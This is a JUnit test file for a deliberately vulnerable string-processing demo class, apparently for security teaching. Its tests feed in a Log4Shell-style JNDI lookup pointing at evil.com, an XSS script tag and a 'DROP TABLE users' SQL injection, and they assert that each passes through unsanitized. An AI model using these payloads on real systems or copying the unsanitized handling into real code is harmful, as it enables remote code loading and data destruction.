package com.example;

import org.junit.Test;
import static org.junit.Assert.*;

/**
 * Test class for VulnerableStringDemo
 * 
 * WARNING: These tests demonstrate known security vulnerabilities
 * and should NOT be used in production environments.
 */
public class VulnerableStringDemoTest {
    
    @Test
    public void testProcessUserInputWithNormalInput() {
        String result = VulnerableStringDemo.processUserInput("normal input");
        assertNotNull("Result should not be null", result);
        assertTrue("Result should contain the input", result.contains("normal input"));
    }
    
    @Test
    public void testProcessUserInputWithNullInput() {
        String result = VulnerableStringDemo.processUserInput(null);
        assertEquals("Should handle null input", "null", result);
    }
    
    @Test
    public void testProcessUserInputWithMaliciousInput() {
        // This test demonstrates how malicious input could be processed
        String maliciousInput = "${jndi:ldap://evil.com/exploit}";
        String result = VulnerableStringDemo.processUserInput(maliciousInput);
        
        // The method should still process the input (vulnerably)
        assertNotNull("Result should not be null", result);
        assertTrue("Result should contain the malicious input", result.contains(maliciousInput));
    }
    
    @Test
    public void testProcessUserInputWithXSSPayload() {
        // Test XSS payload processing
        String xssPayload = "<script>alert('XSS')</script>";
        String result = VulnerableStringDemo.processUserInput(xssPayload);
        
        assertNotNull("Result should not be null", result);
        assertTrue("Result should contain the XSS payload", result.contains(xssPayload));
    }
    
    @Test
    public void testProcessUserInputWithSQLInjection() {
        // Test SQL injection payload
        String sqlPayload = "'; DROP TABLE users; --";
        String result = VulnerableStringDemo.processUserInput(sqlPayload);
        
        assertNotNull("Result should not be null", result);
        assertTrue("Result should contain the SQL payload", result.contains(sqlPayload));
    }
    
    @Test
    public void testProcessUserInputWithJSONPayload() {
        // Test JSON payload processing
        String jsonPayload = "{\"malicious\":\"${jndi:ldap://evil.com}\"}";
        String result = VulnerableStringDemo.processUserInput(jsonPayload);
        
        assertNotNull("Result should not be null", result);
        // The result might be an error message due to JSON parsing
        assertTrue("Result should not be empty", !result.isEmpty());
    }
}
